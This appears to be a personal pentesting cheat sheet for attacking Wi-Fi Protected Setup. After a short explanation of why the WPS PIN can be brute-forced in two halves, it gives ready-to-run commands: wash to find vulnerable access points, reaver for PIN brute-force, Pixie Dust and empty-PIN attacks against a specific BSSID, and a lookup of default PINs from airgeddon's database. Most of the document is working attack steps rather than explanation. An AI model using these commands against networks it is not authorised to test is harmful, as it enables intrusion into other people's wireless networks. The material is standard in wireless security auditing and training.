* Explanation

  WPS (Wi-Fi Protected Setup) was meant to unify WPA and WPA2, 
  mostly by input of a PIN code or button push.

  - Enrolee   -> The device looking to join the network
  - Registrar -> Whose role is to configure `enroleess` to join the network

  Brute force happens in two steps:
  1. First half of the pin is verified if we receive M5 (10,000) combinations
  2. Second half is correct if we receive M7 (1,000) combinations

___

* Use Wash to get information about surrounding APs
@code bash
# Default 2.4GHz
wash -i wlan0mon

# Scan 5GHz
wash -i wlan0mon -5
@end
@code bash
BSSID               Ch  dBm  WPS  Lck  Vendor    ESSID
--------------------------------------------------------------------------------
00:0A:D0:97:39:6F    1  -88  2.0  No   Broadcom  linksys
C8:BC:C8:FE:D9:65    2  -28  2.0  No   AtherosC  secnet
34:08:04:09:3D:38    3  -32  1.0  No   RalinkTe  wifu
@end
Important: 
  - WPS 1.0 is easier since 2.0 has bruteforce mitigations
  - Lck if Yes, we know that the WPS is locked and we cannot attack it

___

* PIN Bruteforce attack
@code bash
sudo reaver -c 3 -b 34:08:04:09:3D:38 -i wlan0mon -vv
@end
___

* PixieWPS attack
@code bash
# Reaver
sudo reaver -c 3 -b 34:08:04:09:3D:38 -i wlan0mon -vv -K

# Bully
# TODO
@end
___

* Verify if PIN is empty and don't need bruteforcing
@code bash
sudo reaver -c 3 -b 34:08:04:09:3D:38 -i wlan0mon -vv -p
@end
___

* Finding default pin values
@code bash
sudo apt install airgeddon

source /usr/share/airgeddon/known_pins.db

# If BSSID starts with 00:13:F7
echo ${PINDB["0013F7"]}
@end
___

* GOOD TO KNOW

  - PixieWPS preferred over Bruteforcing
  - If error after getting pin, restart reaver without -K option
  - When in doubt -vv for debugging
